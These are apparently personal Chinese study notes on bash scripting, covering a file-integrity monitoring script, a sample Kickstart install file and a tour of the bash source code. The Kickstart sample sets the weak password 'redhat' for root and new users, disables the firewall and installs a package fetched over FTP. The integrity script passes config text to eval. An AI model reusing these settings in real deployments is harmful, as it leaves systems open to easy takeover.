https://blog.csdn.net/wangshui898/article/details/81145725?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ETopBlog-1.topblog&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ETopBlog-1.topblog&utm_relevant_index=1

https://blog.csdn.net/tengguang/article/details/1635254?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1.topblog&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1.topblog&utm_relevant_index=2

https://www.baidu.com/link?url=blMUJg332vPO3qjiNQQvlT9djyTQ2LFPM0n338R5aWrfTTLg_dA_xe3tVAL_pCxP2HHxY-6-CPcGurkaOBT_da&wd=&eqid=ba6d160b0013184800000004624b096d

### 4.线上操作记录审核脚本

### 5.文本完整性审核脚本

实现功能

1、能监测多个不同目录中文件的增删改变化。

2、允许监测的特定类型文件，并可根据具体情况设定是否需要生成摘要等。

3、对于变动的文件，新增或修改的可以生成摘要。删除的文件要有日志记录。

4、当监测到文件发生变动时，能生成简报以邮件方式提醒管理员。

设计思路

建立监测项配置文件，将需检测的目录路径以及相关设置记录在文件中。利用crontab定时执行脚本，第一次运行时按配置文件加载检测项，通过find命令获取文件列表，利用md5sum为符合条件的文件生成hash值，并保存到文件中做为以后校验的基准数据。脚本在以后的运行中，首先会将待测目录中符合条件的文件列出，并于基准数据中的文件进行比对，以发现新增文件。再利用md5sum检测目录中文件是否有被修改或删除。对修改或新增文件生成摘要，将检测结果生成简报存入日志文件，并将简报发送到指定邮箱。

监测项配置文件说明

配置文件每一行为一个检测目录项，配置项之间以逗号分隔，配置定义如下：

<待查目录>,<过滤条件>,<检测类型>

1、待查目录

需检测的目录完整路径，例如:/var/test

2、过滤条件

写在此处的内容会做为find命令中的查询条件，以过滤特定文件。例如：-name '*.txt' -type f 

过滤条件字串中不要使用双引号。

3、检测类型

取值为0或1。

0：发现变更仅记录文件名不做摘要;（一般针对二进制文件检测）

1：发现变更则做摘要

程序运行方式

脚本可以通过crontab定时执行。同时为了方便日常工作，脚本支持参数运行。具体参数及用途如下：

-c 清空日志
-i 生成扫描项的验证码文件，做为原始校验范本。（一般用于文件正常变更后，管理员手动重新生成基准检验文件）
-s 生成所有扫描项的摘要文件。（一般用于初次生成HASH值之前，生成所有符合文件摘要，供管理员做检测）

```bash
#!/bin/bash
#
#Name:CheckFile
#Ver:1.2
#
#程序说明：
#文件完备性检测程序
#
#实现功能：
#监测指定目录的指定类型文件变动情况，
#对于删除的文件做日志记录
#对于添加或修改的文件做内容取样

BASEDIR=`dirname $0`    #程序所在目录
CONFFILE="$BASEDIR/checkfile.cfg"     #任务配置文件
LOGFILE="$BASEDIR/event.log"     #运行记录文件
CHECKDIR="$BASEDIR/chk/"     #原始校验码存放文件保存目录
SUMMARYDIR="$BASEDIR/summary/"     #快照文件保存目录
REMINDFLGFILE="$BASEDIR/remind.flg"     #邮件发送标志文件
REMINDINTERVAL=7200     #邮件提醒最短间隔时间

declare -a aCheckList
declare -a aFileList
declare -a aCheckResult
IFS=$'\n'
FindCmd="/usr/bin/find"
CheckCmd="/usr/bin/md5sum"

#获取任务配置信息
function GetConf()
{
  if ! [ -f $CONFFILE ]; then
    echo "ERROR:can not find checkfile">>$LOGFILE
    return
  fi
  local ConfigList=`grep -v '^\s*#' $CONFFILE|sed '/^\s*$/d'|uniq`
  aCheckList=()
  for i in $ConfigList
  do
    local Search=`echo $i|awk -F, '{print $1}'`     #Search为查询参数
    local Arg=`echo $i|awk -F, '{print $2}'`      #查询附加参数,会添加到find的-name参数值中
    local Type=`echo $i|awk -F, '{print $3}'`     #Type为操作类型，0：发现变更仅记录文件名不做摘要; 1：发现变更则做摘要
    if (( ${#Search} < 2 )); then
      continue
    fi
    if (( ${#Type} < 1 )); then
      Type="1"
    fi
    #利用MD5为每个任务生成唯一标识,也做为校验码存放文件的文件名
    local tn=`echo "$Search"|$CheckCmd|awk '{print $1}'`
    
    aCheckList=(${aCheckList[@]} "$Search,$Arg,$Type,$tn")
  done
}

#校验符合条件文件内容
function CheckFile()
{
  if (( ${#1} < 2 )); then
    echo "ERROR:can not analyse check item $1">>$LOGFILE
    return
  fi
  local Search=`echo $1|awk -F, '{print $1}'`
  local Arg=`echo $1|awk -F, '{print $2}'`
  local Type=`echo $1|awk -F, '{print $3}'`
  local Fn=$CHECKDIR`echo $1|awk -F, '{print $4}'`".chk"
  local NeedCreate=0
  local NewFile=()
  local CheckOK=1
  if [ -f $Fn ]; then
    if (( `wc -l $Fn|awk '{print $1}'` < 1 )); then
      NeedCreate=1
    fi
  else
    NeedCreate=1
  fi
  NFlist=$(mktemp)
  eval "$FindCmd $Search $Arg ! -type d |sort >$NFlist 2>>$LOGFILE"
  if (( $NeedCreate > 0 )); then
    `cat $NFlist |xargs $CheckCmd >$Fn 2>>$LOGFILE`
    chmod 600 $Fn
    return
  else
    #判断是否新增了文件
    OFlist=$(mktemp)
    `cat $Fn|awk '{print $2}'|sort >$OFlist`
    NewFile=`comm -23 $NFlist $OFlist`
    for i in $NewFile
    do
      if (( ${#i} < 2 )); then
        continue
      fi
      if [ -f $i ]; then
        aCheckResult=(${aCheckResult[@]} $i"_Increased!")
        echo $i" Increased!" >>$LOGFILE
        CheckOK=0
        if [ $Type != "0" ]; then
          GetSummary $i
        fi
      fi
    done
    rm -f $OFlist
    rm -f $NFlist
  fi
  local FailedList=`$CheckCmd -c $Fn 2>/dev/null|grep FAILED|sed 's/: FAILED.*$//g'|sed '/^\s*$/d'`
  for i in $FailedList
  do
    if (( ${#i} < 2 )); then
      continue
    fi
    if [ -f $i ]; then
      #对修改过的文件进行记录
      aCheckResult=(${aCheckResult[@]} $i"_has_been_modified!")
      echo $i" has been modified!" >>$LOGFILE
      CheckOK=0
      if [ $Type != "0" ]; then
        GetSummary $i
      fi
    else
      #对删除的文件进行记录
      aCheckResult=(${aCheckResult[@]} $i"_can_not_found!")
      echo $i" can not found!" >>$LOGFILE
      CheckOK=0
    fi
  done
  return $CheckOK
}

#对指定文件做摘要
function GetSummary()
{
  if (( ${#1} < 1 )); then
    return
  fi
  local SummFile=$SUMMARYDIR`date +%Y%m%d`".summ"
  if (( ${#2} > 3 )); then
     SummFile=$2 
  fi
  echo "">>$SummFile
  echo `date`>>$SummFile
  echo $1>>$SummFile
  echo "--------------------------------------------------" >>$SummFile
  if  [ -f $1 ]; then
    #例程只是简单取文件前5行做摘要,可以根据实际情况自行修改摘要方法
    head -n 5 $1 >>$SummFile
  else
    echo "can not found file" >>$SummFile
  fi
  echo "==================================================" >>$SummFile
  chmod 600 $SummFile
}


#main
if ! [ -d $CHECKDIR ]; then
  mkdir $CHECKDIR
  chmod 700 $CHECKDIR
fi
if ! [ -d $SUMMARYDIR ]; then
  mkdir $SUMMARYDIR
  chmod 700 $SUMMARYDIR
fi
GetConf
OutputFile=""
while getopts :ichsm opt
do
  case $opt in
  i)
    for i in ${aCheckList[@]}
    do
      Search=`echo $i|awk -F, '{print $1}'`
      Arg=`echo $i|awk -F, '{print $2}'`
      Fn=$CHECKDIR`echo $i|awk -F, '{print $4}'`".chk"
      eval "$FindCmd $Search $Arg -exec $CheckCmd {} \; >$Fn 2>>$LOGFILE"
      chmod 600 $Fn
    done
    aCheckList=()
    ;;
  c)
    `cat /dev/null`>$LOGFILE
    aCheckList=()
    ;;
  s)
    for i in ${aCheckList[@]}
    do
      Search=`echo $i|awk -F, '{print $1}'`
      Arg=`echo $i|awk -F, '{print $2}'`
      t=`$FindCmd $Search -name "$Arg"`
      for j in ${t[@]}
      do
        GetSummary $j
      done
    done
    aCheckList=()
    ;;
  h)
    echo "-h 获取帮助"
    echo "-c 清空日志"
    echo "-i 生成扫描项的验证码文件，做为原始校验范本"
    echo "-s 生成所有扫描项的摘要文件"
    aCheckList=()
    ;;
  *)
  ;;
esac
done  
if (( ${#aCheckList[@]} > 0 )); then
  echo "checkfile start at "`date`>>$LOGFILE
  aCheckResult=()
  for i in ${aCheckList[@]}
  do
    Search=`echo $i|awk -F, '{print $1}'`
    CheckFile $i
    if (( $? == 1 )); then
      echo $Search" Check OK!" >>$LOGFILE
    fi
  done
  #在合理的间隔时间内发送检测异常报告邮件
  #此处可以进一步对检测结果的HASH值与上次结果的HASH值做对比,发现不同再报告.可以根据自身需求自行修改
  if (( ${#aCheckResult[@]} > 0 )); then
    NowTime=`date +%s`
    SendTime=0
    if [ -f $REMINDFLGFILE ]; then
      SendTime=`cat $REMINDFLGFILE`
    else
      SendTime=0
    fi
    tDiff=$[ $NowTime - $SendTime ]
    if (( $tDiff > $REMINDINTERVAL )); then
      echo ${aCheckResult[@]}|sed "s/\s/\n/g" | mail -s "Check FAILED!" test@test.test    #此处更换成自己的邮箱地址
      echo $NowTime >$REMINDFLGFILE
    fi
  fi
  echo "checkfile finished at "`date`>>$LOGFILE
fi

```

几个重点；

```bash
#利用MD5为每个任务生成唯一标识,也做为校验码存放文件的文件名
CheckCmd="/usr/bin/md5sum"
local tn=`echo "$Search"|$CheckCmd|awk '{print $1}'`
#得到结果后进行数组添加加上实际操作
 aCheckResult=(${aCheckResult[@]} $i"_Increased!")
 echo $i" Increased!" >>$LOGFILE
 #在main方法中我们可以将所有修改进行输出（通过对数组里面添加的数据的读写）
  for i in ${aCheckList[@]}
    do
      Search=`echo $i|awk -F, '{print $1}'`
      Arg=`echo $i|awk -F, '{print $2}'`
      Fn=$CHECKDIR`echo $i|awk -F, '{print $4}'`".chk"
      eval "$FindCmd $Search $Arg -exec $CheckCmd {} \; >$Fn 2>>$LOGFILE"
      chmod 600 $Fn
    done
```





### 6.kickstart配置脚本

kickstart是一个利用Anconda工具实现服务器自动化安装的方法；通过生成的kickstart配置文件ks.cfg，服务器安装可以实现从裸机到全功能服务的的非交互式（无人值守式）安装配置；ks.cfg是一个简单的文本文件，文件包含Anconda在安装系统及安装后配置服务时所需要获取的一些必要配置信息（如键盘设置，语言设置，分区设置等）；Anconda直接从该文件中读取必要的配置，只要该文件信息配置正确无误且满足所有系统需求，就不再需要同用户进行交互获取信息，从而实现安装的自动化；但是配置中如果忽略任何必需的项目，安装程序会提示用户输入相关的项目的选择，就象用户在典型的安装过程中所遇到的一样。一旦用户进行了选择，安装会以非交互的方式（unattended）继续。

[kickstart 配置文件选项详解](https://www.cnblogs.com/bpsanshao/p/15315260.html)

要求

```
客户端的网卡必须支持PXE；

KickStart服务器必须具备下面的服务：

DHCP 服务器，用来给客户端的网卡分配ip，并且通过dhcp协议指出tftp的PXE引导文件（pxelinux.0）位置；

TFTP 服务器，用来将引导内核的程序（pxelinux.0、pxelinux.cfg/default、vmlinuz、initrd.img）传输到客户机，并指引ks.cfg文件的位置；

HTTP 服务器，部署ks.cfg自动安装文件和操作系统的安装光盘文件（还可以是NFS、FTP服务器）；

注：DHCP,TFTP,HTTP服务都是在同一个服务器上运行的
```

```bash
#前面可以补充安装DHCP TFTP HTTP等脚本
###############################################################
#
# Sample Kickstart Configuration File
#
###############################################################
###############################################################
#
# point to a local installation server, or use "cdrom"
#
###############################################################
url --url http://rha-server/pub/rhel5/
#cdrom
rootpw redhat
bootloader --location=mbr --password=redhat
###############################################################
#
# partitioning
#
###############################################################
zerombr yes
clearpart --all --initlabel
part /boot --fstype ext3 --size 128
part / --fstype ext3 --size 1 --grow
part swap --recommended
###############################################################
#
# network configuration
# - the following is for the "recommended solution" outlined
# in the Red Hat Academy Instructor's Guide
#
###############################################################
network --bootproto=dhcp --device=eth0
firewall --disabled
#network --bootproto=static --ip=192.168.0.254 --netmask=255.255.255.0
--device=eth0
#firewall --medium --http --port=https:tcp
###############################################################
#
# environment
#
###############################################################
lang zh_CN.UTF-8
timezone Asia/Shanghai
###############################################################
#
# hardware
#
###############################################################
keyboard us
xconfig --startxonboot
###############################################################
# misc
###############################################################
key --skip # skip install number
authconfig --enableshadow --enablemd5
reboot # reboot automatically when done
install # instead of "upgrade"
###############################################################
#
# Software
#
###############################################################
%packages --resolvedeps
@admin-tools
@editors
@text-internet
@gnome-desktop
@core
@base
@base-x
@chinese-support
@sound-and-video
@graphical-internet
emacs
kexec-tools
device-mapper-multipath
xorg-x11-utils
xorg-x11-server-Xnest
-sysreport
%post
###############################################################
#
# Post Script - the following script runs on the newly
# installed machine, immediately after installation
#
###############################################################
echo "nameserver 192.168.0.254" >> /etc/resolv.conf
rpm -ivh ftp://rha-server/rha/autoupdate/rha-base*.rpm
#rpm -Fvh ftp://Kickstart.example.com/pub/9/i386/updates/*.rpm
#curl http://rha-server/rha/xorg.conf > /etc/X11/xorg.conf
#curl http://rha-server/rha/station.cfg | tar xvzf -
for i in elvis blondie prince madonna; do
useradd $i
echo redhat | passwd --stdin $i
done
```



第九章到第十六章从20220403到20220404



## 第十七章 shell创建库

使用函数可以在脚本中省去一些输入工作，但如果你碰巧要在多个脚本中使用同一段代码呢？显然，为了使用一次而在每个脚本中都定义同样的函数太过麻烦。bash shell允许创建函数库文件，然后在多个脚本中引用该库文件。
这个过程的第一步是创建一个包含脚本中所需函数的公用库文件。这里有个叫作myfuncs的库文件，它定义了3个简单的函数。

```bash
$ cat myfuncs 
function addem { 
	echo $[ $1 + $2 ] 
} 
function multem { 
	echo $[ $1 * $2 ] 
} 
function divem { 
	if [ $2 -ne 0 ] 
	then 
		echo $[ $1 / $2 ] 
	else 
		echo -1 
	fi 
} 
$ 
```

下一步是在用到这些函数的脚本文件中包含myfuncs库文件。从这里开始，事情就变复杂了。
问题出在shell函数的作用域上。和环境变量一样，shell函数仅在定义它的shell会话内有效。
如果在shell命令行界面的提示符下运行myfuncs shell脚本，shell会创建一个新的shell并在其中运行这个脚本。它会为那个新shell定义这三个函数，但当运行另外一个要用到这些函数的脚本时，它们是无法使用的。
这同样适用于脚本。如果尝试像普通脚本文件那样运行库文件，函数并不会出现在脚本中。



```bash
$ cat badtest
#!/bin/bash 
./myfuncs 
result=$(addem 10 15) 
echo "The result is $result" 
$ 
$ ./badtest
./badtest4: addem: command not found 
The result is 
$ 

```

使用函数库的关键在于source命令。source命令会在当前shell上下文中执行命令，而不是创建一个新shell。可以用source命令来在shell脚本中运行库文件脚本。这样脚本就可以使用库中的函数了。
source命令有个快捷的别名，称作点操作符（dot operator）。要在shell脚本中运行myfuncs库文件，只需添加下面这行：

```bash
. ./myfuncs 
```

这个例子假定myfuncs库文件和shell脚本位于同一目录。如果不是，需要使用相应路径访问该文件。这里有个用myfuncs库文件创建脚本的例子。

```bash
$ cat test
#!/bin/bash 
. ./myfuncs 
value1=10 
value2=5 
result1=$(addem $value1 $value2) 
result2=$(multem $value1 $value2) 
result3=$(divem $value1 $value2) 
echo "The result of adding them is: $result1" 
echo "The result of multiplying them is: $result2" 
echo "The result of dividing them is: $result3" 
$ 
$ ./test
The result of adding them is: 15 
The result of multiplying them is: 50 
The result of dividing them is: 2 
$ 
```

该脚本成功地使用了myfuncs库文件中定义的函数。



## 第十八章  好 ！ 现在我们学习怎个改bash的源码

**bash基本架构图**

![image-20220407200649465](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407200649465.png)

bash使用GNU Readline库处理用户命令输入，Readline提供类似于vi或emacs的行编辑功能。

bash运行时的调度中心是其主控循环。主控循环的功能较为简单，它循环读取用户（或脚本）输入，传递给语法分析器，同时处理下层递归返回的错误。

语法分析器对文本形式的输入首先进行通配符、别名、算术和变量展开等工作，然后通过命令生成器得到规范的命令结构，并由专门的重定向处理机制填写重定向语义，交由命令执行器执行。命令执行器依据命令种类不同，执行内部命令函数、外部程序或文件系统调用。在命令执行过程中，执行器要对系统信号进行捕获和处理。

在支持作业管理的操作系统中，命令执行器将进程信息加入作业控制机制，并允许用户使用内部命令或键盘信号来启停作业。如果在不支持作业管理的操作系统中编译bash，会使用另一套接口相同的机制对进程信息进行简单的维护。

### 各个文件分析

#### shell.c/shell.h

shell.c是main()函数的所在，它定义了shell启动和运行过程中的一些状态量，依据不同的启动参数、[环境变量](https://so.csdn.net/so/search?q=环境变量&spm=1001.2101.3001.7020)等来初始化shell的工作状态(包括受限模式等)，之后进入eval.c中的交互循环函数reader_loop()解析命令直到退出。

![image-20220407205202797](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407205202797.png)

初始化函数shell_initialize()调用了variables.c中的initialize_shell_variables()、set.c中的initialize_shell_options()等一系列子模块初始化函数。如果要新增功能模块，可以将它们的初始化调用放在这里。

![image-20220407205601657](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407205601657.png)

![image-20220407205612859](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407205612859.png)

un_startup_files()函数执行~/.profile、~/.bash_profile、~/.bash_login等配置文件，同时判断了bash是否是由sshd或rshd启动的。对于login shell，不执行~/.bashrc；对于non-login交互式shell，或通过sshd、rshd启动的shell，执行~/.bashrc。

![image-20220407210303745](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407210303745.png)

![image-20220407205953460](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407205953460.png)

run_one_command()函数处理了-c参数运行一条命令的模式。

open_shell_script()函数处理运行脚本文件的模式。

退出函数exit_shell()处理了挂起作业、保存历史等善后工作。

#### eval.c

读取并解释执行shell命令。主循环为reader_loop()函数，它调用read_command()，read_command()调用parse_command()，parse_command()调用语法分析器y.tab.c中的yyparse()。得到命令后，reader_loop()调用execute_cmd.c中的execute_command()执行命令。

![image-20220407211907109](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407211907109.png)

![image-20220407212008062](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407212008062.png)

![image-20220407212223792](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407212223792.png)

注：token查找优先顺序：别名>关键字>函数>内部命令>脚本或可执行程序。

#### execute_cmd.c/execute_cmd.h

执行命令(COMMAND结构)。外部调用接口是execute_command()，内部通过execute_command_internal()执行命令。execute_command_internal()包含可选的管道重定向以及后台运行的参数。

针对不同类型的命令(控制结构、函数、算术等)，execute_command_internal()调用不同的函数来完成相应功能。其中execute_builtin()执行内部命令；execute_disk_command()执行外部文件。execute_disk_command()通过调用jobs.c或nojobs.c中的make_child()来fork新进程执行。

#### 其他详细介绍参考:https://blog.csdn.net/ruglcc/article/details/8574113



### 其它目录

#### builtins

该目录下是内部命令的源代码。

每个内部命令是一个def文件，Makefile中DEFSRC声明了所有内部命令的def文件。

由mkbuiltins.c生成编译时辅助工具mkbuiltins，mkbuiltins处理*.def文件，生成命令的*.c源程序以及builtins.c、builtext.h。builtins.c和builtext.h相当于各个内部命令的索引。

所有文件最后编译得到libbuiltins.a。

此例试验加入一个了内部命令。

![image-20220409193800487](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220409193800487.png)

看 我们成功的找到了我们的rm

![image-20220409193729501](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220409193729501.png)

#### tests

make tests所用测试脚本，可用于对扩展后的bash的验证。

### 主要流程分析

#### 4.1. 命令解析与执行

bash启动并初始化完成后，进入eval.c中的交互循环函数reader_loop()开始解析命令。reader_loop()不断循环读取和执行命令，直到遇到EOF。

reader_loop()中读取命令调用的是read_command()函数，read_command()调用parse_command()，parse_command()调用语法分析器y.tab.c中的yyparse()，最终取到命令。read_command()将读到的命令存入了全局变量global_command。其中：

read_command()的额外工作是执行“shell空闲一段时间后自动登出”功能（环境变量TMOUT）。

parse_command()的额外工作是执行PROMPT_COMMAND指定的命令，调用处理here document的函数。

yyparse()由yacc通过parse.y生成。它分析出命令语法后，调用make_cmd.c中的各种函数生成不同的COMMAND结构对象，用以执行。

读到命令后，reader_loop()调用execute_cmd.c中的execute_command()执行命令。针对不同类型的命令（控制结构、函数、算术、重定向等），execute_command_internal()调用不同的函数来完成相应功能。其中execute_builtin()执行内部命令；execute_disk_command()执行外部文件。execute_disk_command()通过调用jobs.c或nojobs.c中的make_child()来fork新进程执行。

make_child()同步了输入流缓冲区，然后fork新进程。对于jobs.c版的make_child()，对作业做一些初始化工作，再将待执行的命令通过add_process()函数加入启动进程链表。

从make_child()返回后，execute_disk_command()判断pid，如果是子进程，就调用shell_execve()函数在该函数中执行（exec）目标命令，同时做一些错误处理。

源程序对execute_disk_command()的注释如下：

#### 4.2. 重定向的实现

COMMAND结构有一个REDIRECT类型的指针（redirects），指向了本命令的重定向信息。

REDIRECT结构记录了重定向的源描述符和目标：redirectee（类型为REDIRECTEE），REDIRECTEE是一个联合类型，它可以是目标描述符或目标文件名。REDIRECT本身包含指向下一个REDIRECT对象的指针，因此对于一个COMMAND对象，可以有一系列重定向信息构成的链表。

语法分析器在遇到重定向语法时，调用make_cmd.c中的make_redirection()函数填写COMMAND结构的REDIRECT参数，并设置表示重定向方式的标志位。

execute_cmd.c中的函数执行命令时，调用redir.c中的do_redirections()实现重定向。对于重定向信息链表中的每个REDIRECT对象，分别交由do_redirection_internal()处理。

do_redirection_internal()针对重定向方式的标志位，做一些特定的设置，然后调用redir_open()。

redir_open()对于不同的重定向目标，调用不同的函数完成文件描述符的打开操作。例如软驱和网络设备文件调用redir_special_open()，对于noclobber mode（禁止覆盖变量模式）调用redir_special_open()，一般情况下调用常规的open()，打开系统最小未用的文件描述符，实现重定向。

#### 内部命令（built-in）的构建(改编参考的重点)

源代码目录（记为$(srcdir)）下的builtins目录存储的是各个内部命令的源代码预定义文件（*.def）。在make的过程中，由mkbuiltins工具将它们预编译为源程序（*.c），进而编译为目标文件（*.o）。mkbuiltins工具是由同一目录下的mkbuiltins.c编译生成的，它在处理*.def文件的同时，还会生成builtins.c和builtext.h两个文件，用做bash主程序调用内部命令的接口以及各个内部命令的索引。

我们可以看看rm的脚本文件

![image-20220409201708641](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220409201708641.png)

奇怪 一些重要的都有 为啥没有rm的

没事我们继续往下看

要添加一条新内部命令，只需参考原有命令的存在形式即可，步骤如下：

```bash
1、新建预定义文件：$(srcdir)/builtins/[命令名].def。可复制已有命令的预定义文件，修改其中的$PRODUCES、$BUILTIN、$FUNCTION、$SHORT_DOC等定义，使之与命令名相符。

2、在预定义文件中建立命令处理函数，原型参考已有命令的处理函数，函数名与$FUNCTION的定义一致。参数为WORD_LIST *list，该结构的定义在$(srcdir)/command.h中。处理参数的具体方法同样可参考已有的命令（如echo）的处理函数。

3、修改$(srcdir)/builtins/Makefile.in，参照已有的命令，分别在DEFSRC、OFILES添加对[命令名].def、[命令名].o的定义；添加[命令名].o对[命令名].def以及其它头文件的依赖关系。

4、回到$(srcdir)下，对源代码进行configure、make，如果一切顺利的话，此时生成的bash程序将包含新添加的内部命令。
```

新建一条“linjian”命令

本例中添加的命令处理函数为：

```c
int linjian_builtin (list)
     WORD_LIST *list;
{
  printf ("This is a built-in for test by Lin Jian.\n");
  if (list)
    printf("Parameter: %s\n", list->word->word);
  return (EXECUTION_SUCCESS);
}
```

编译后试验结果如下：

```shell
#在原版bash下工作：
lj@lj-laptop:~/bash-3.2$ ps
  PID TTY          TIME CMD
 6212 pts/2    00:00:00 bash
 9893 pts/2    00:00:00 ps
lj@lj-laptop:~/bash-3.2$ linjian
-bash: linjian: command not found 
#进入修改后的bash：
lj@lj-laptop:~/bash-3.2$ ./bash
lj@lj-laptop:~/bash-3.2$ ps
  PID TTY          TIME CMD
 6212 pts/2    00:00:00 bash
 9904 pts/2    00:00:00 bash
 9922 pts/2    00:00:00 ps
lj@lj-laptop:~/bash-3.2$ linjian hello!
This is a built-in for test by Lin Jian.
Parameter: hello!
lj@lj-laptop:~/bash-3.2$ type linjian
linjian is a shell builtin
```

#### 环境变量与上下文

Linux中每个进程都有自己的环境（main函数的char *env[]参数指向），环境是由一组变量组成的，这些变量中存有进程可能需要引用的上下文信息。bash将环境变量的复本保存在variables.c中名为shell_variables的全局VAR_CONTEXT结构中。要导出给子进程的变量由全局字符串指针char **export_env记录，形式是“名=值”字符串数组，也就是键入export命令看到的内容。

bash启动后，调用variables.c中的initialize_shell_variables()函数，传入来自main函数的env参数，将env中的环境变量存入shell_variables。对于PATH、IFS、PS1之类bash本身要使用的环境变量，如果env中尚无，则在此时建立。另外一些有关bash版本、命令历史、邮件检查等内部辅助功能的环境变量也在这里建立。

execute_cmd.c中调用各类命令的函数在执行命令之前，首先调用variables.c中的maybe_make_export_env()函数，构建导出给子进程的环境，即export_env。shell_execve()执行外部命令时使用的是exec族中的execve()函数，因此可以将export_env传递给bash启动的子进程。

==凡需要增改环境变量的地方，调用variables.c中的bind_variable()函数实现。例如在cd命令执行后需要重设PWD。==

#### 4.5. 由sshd启动bash的过程

bash启动时，shell.c中的run_startup_files()通过查找SSH_CLIENT、SSH2_CLIENT环境变量是否存在，来判断自己是不是由sshd启动的，记录在变量run_by_ssh中。此外可以通过检查stdin的文件描述符是否被重定向为网络文件或套接字来判断bash是不是由rshd启动的。如果bash启动自sshd或rshd，并且是顶层shell（非子shell），则执行~/.bashrc脚本

防止~/.bashrc被多次执行的方法是只在bash是顶层shell时加载之。作者曾考虑在initialize_shell_variables()过程中设置SSH_CLIENT、SSH2_CLIENT环境变量为非导出的，来避免子shell知道自己的父shell是由sshd启动的，从而不执行~/.bashrc。但他最终放弃了这个方法。

除此以外，bash对ssh没有其它特殊处理。

#### 4.6. 子shell

shell启动的shell子进程称为子shell。直接以文件名运行可执行文件时，bash并不知道它调用的一个可执行是二进制文件还是脚本，只是在exec过程中交给系统内核处理。对于shell脚本，通常以“#![shell可执行文件名]”开头，“#!”是一种magic number。当内核通过magic number断定执行的是脚本时，就会调用一个新的指定的shell的实例来解释执行脚本，这个实例就是子shell。父子shell是两个进程，所以各自的变量是独立的。除非父shell将自己的变量导出到环境中，否则子shell无法获得父shell中定义的变量。

使用source命令（“.”命令）执行脚本时，不开启子shell。bash内部的实现是将脚本文件内容读入一个缓冲区，然后执行语法分析，因此效果与直接从键盘输入脚本内容相同。

### 杂记

####  bash编程风格

bash的C语言函数声明使用了“__P”宏，定义遵循K&R规范，因此可以使用旧的非ANSI的编译器编译。bash源代码充分考虑了不同的CPU体系结构、不同的操作系统和不同的编译器的差异，使用宏和条件编译处理这类问题，增强可移植性的同时不增加代码复杂性。对于某些可选择编译的特性，bash通过定义宏作为开关，这些宏可以在configure时由用户参数决定取值，不需要编译者显式修改源代码。

bash的代码缩进风格并不是很统一，可能是有来自不同贡献者的代码。多数代码与常见的Java风格差异较大，有些地方不借助Source Insight这样的工具很容易找不到头绪。bash并不十分避讳goto的使用，一些使用goto的地方的可读性还是比较好的。

由于多数函数名称都是完整的动宾短语，所以并非每个函数都有注释，通过名称可以了解其大致功能。对于某些复杂的流程，函数内部有一些注释，不少注释具有讨论和建议的性质，对未来的贡献者有启发性。和大多数GNU程序一样，bash中也有不少风趣的注释，体现出西方特色的幽默。

### 学习备注（Q&A）

#### Q：__P是什么？

A：ANSI C之前的旧编译器不支持函数原型定义。使用“__P”宏为ANSI和非ANSI的编译器提供一种可移植的方案。“__P”的实现通常如下：

```c
 if defined(__STDC__) || defined(__GNUC__)
  definec__P(x) x
 else
   define __P(x) ()
 endif
```

#### Q：Here Document是什么？

一个here document就是一段带有特殊目的的代码段。它使用I/O重定向的形式将一个命令序列传递到一个交互程序或者命令中，比如ftp、cat或者ex文本编辑器。例如：

```c
COMMAND <<InputComesFromHERE
...
InputComesFromHERE
```

### rm流程分析

![image-20220410234446941](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220410234446941.png)

有个rm.c源码

位于C:\Users\e'e't\Desktop\红队安全开发\shell编程\bash-5.1.12\examples\loadables\rm.c













































## 第十九章 自己写脚本

### 1.编写一个脚本。当我们每次创建sh文件的时候,在第一行自动输入“#!/bin/bash”

![image-20220403143759553](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403143759553.png)

![](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C6.gif)

### 2.每次sh脚本编写完成后，自动对它进行赋权限

![image-20220403145018161](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403145018161.png)

![image-20220403145007859](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403145007859.png)

![image-20220403145157484](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403145157484.png)

前面两个脚本有个小错误。产生了报错、修改在上面

![image-20220403145325376](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403145325376.png)

现在不会报错了

### 3.如何将文件里面的数据读取到变量中

dataline=$(cat /root/data/data.txt)

echo $dataline

又或者直接 $1，然后脚本执行的时候带上

```
填一下坑:
1.这样的话echo $dataline中没有换行符（它自动把换行符弄到了）。导致后续难以进行操作

```

2.后续无法直接对参数进行awk操作![image-20220405151234950](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405151234950.png)



正确做法.

#### 方法一(适用于数据在多种情况):

1.新创建一个文件，然后将文件地址赋值给参数1

![image-20220405151509994](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405151509994.png)

2.将我们要的数据重定向给参数1

可以通过curl或者 cat 等多种方法

![image-20220405151630760](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405151630760.png)

